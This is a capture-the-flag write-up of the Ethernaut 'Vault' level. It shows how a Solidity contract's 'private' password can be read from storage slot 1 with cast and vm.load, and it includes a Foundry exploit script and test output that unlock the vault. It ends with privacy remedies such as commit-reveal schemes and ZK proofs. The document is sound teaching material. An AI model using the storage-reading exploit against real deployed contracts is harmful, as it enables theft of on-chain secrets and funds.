# 08 - Vault

## 1. Challenge Overview

- **Objective**: Unlock the vault by setting `locked` to `false`.
- **Vulnerability Category**: The Fallacy of On-Chain Privacy / Cleartext Storage of Sensitive Data (SWC-136).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

---

## 3. Vulnerability Analysis

### The `private` Keyword Myth

In Solidity:

- `private` and `internal` are **compile-time visibility restrictions**, NOT encryption!
- They only prevent other smart contracts from accessing variables via code inheritance or external calls.
- Every byte of contract state is permanently stored on public Ethereum nodes and accessible to anyone.

### EVM Storage Packing & Slot Layout

EVM storage consists of a 2^256-length array of 32-byte slots:

1. **Slot 0**: `bool public locked;`
   - A `bool` occupies 1 byte (`0x01` or `0x00`).
   - 31 bytes remain empty in Slot 0.
2. **Slot 1**: `bytes32 private password;`
   - A `bytes32` requires a full 32 bytes.
   - Because it cannot fit in the remaining 31 bytes of Slot 0, the compiler starts it on a fresh slot boundary: **Slot 1**!

| Slot Number | Variable   | Type      | Byte Size | Notes                          |
| ----------- | ---------- | --------- | --------- | ------------------------------ |
| **Slot 0**  | `locked`   | `bool`    | 1 byte    | Initial value: `0x01` (`true`) |
| **Slot 1**  | `password` | `bytes32` | 32 bytes  | The secret password!           |

---

## 4. How to Read "Private" Storage

### Method A: Terminal via Cast

You can read Slot 1 directly using `cast storage` (or `make storage SLOT=1`):

```bash
cast storage <INSTANCE_ADDRESS> 1 --rpc-url <RPC_URL>
```

### Method B: Foundry Scripts / Tests

Foundry provides the `vm.load(target, slot)` cheatcode:

```solidity
bytes32 password = vm.load(instance, bytes32(uint256(1)));
```

---

## 5. Exploit Architecture

### Interface (`src/interfaces/IVault.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}
```

### Proof-of-Concept Test (`test/08-Vault.t.sol`)

```bash
forge test --match-contract VaultTest -vvvv
```

```text
Ran 2 tests for test/08-Vault.t.sol:VaultTest
[PASS] test_InitialStateIsLocked() (gas: 7666)
[PASS] test_ReadPrivateStorageAndUnlock() (gas: 12805)
Logs:
  Local PoC Success: Leaked password was:
  0x415f566572795f5365637265745f50617373776f72645f313233343536373800
Suite result: ok. 2 passed; 0 failed
```

### Exploit Script (`script/08-Vault.s.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IVault} from "../src/interfaces/IVault.sol";

contract VaultScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IVault target = IVault(instance);

        console2.log("--- Vault Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Locked Before  :", target.locked());

        // Read Slot 1 from target contract storage
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        console2.log("Leaked Password from Slot 1:");
        console2.logBytes32(password);

        vm.startBroadcast(privateKey);

        target.unlock(password);

        vm.stopBroadcast();

        console2.log("Locked After   :", target.locked());
        require(!target.locked(), "Exploit failed: Vault is still locked");
        console2.log(">>> SUCCESS! Vault unlocked! Submit instance in Ethernaut. <<<");
    }
}
```

---

## 6. Real-World Security Implications

- **Guessing / Betting Games**: Early contracts stored secrets or random seeds in `private` variables, expecting players not to know them. Attackers read the storage and won every time.
- **Sealed-Bid Auctions**: Storing unencrypted bids on-chain allows MEV bots or competitors to read the bids before the auction closes.
- **Accidental Key Leaks**: Developers sometimes mistakenly store API keys, salts, or credentials in contract storage.

---

## 7. How to Achieve True Privacy in Web3

1. **Commit-Reveal Schemes**: Store only a cryptographic commitment `hash(value + salt)` during the hidden phase, then reveal `value` and `salt` later.
2. **Zero-Knowledge Proofs (ZKP / zk-SNARKs)**: Prove knowledge of a secret without ever revealing the secret itself on-chain (e.g., Tornado Cash, Semaphore, ZK-Rollups).
3. **Off-Chain Encryption**: Encrypt sensitive data off-chain using asymmetric keys before uploading to decentralized storage.
